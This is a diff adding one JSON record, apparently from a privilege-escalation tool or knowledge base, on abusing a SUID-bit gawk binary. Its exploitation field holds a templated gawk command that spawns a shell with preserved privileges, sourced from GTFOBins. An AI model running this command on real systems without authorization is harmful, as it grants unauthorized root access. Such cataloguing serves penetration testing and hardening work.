@@ -1,0 +1,11 @@
+{
+  "id": "suid_gawk",
+  "category": "SUID_GTFOBINS",
+  "binary": "gawk",
+  "cve": null,
+  "exploitation": ["{{binary}} 'BEGIN {system(\"{{shell}} -p\")}'"],
+  "post_exploit": ["id"],
+  "source": "gtfobins.github.io",
+  "tags": ["suid", "gtfobins"],
+  "severity": "high"
+}
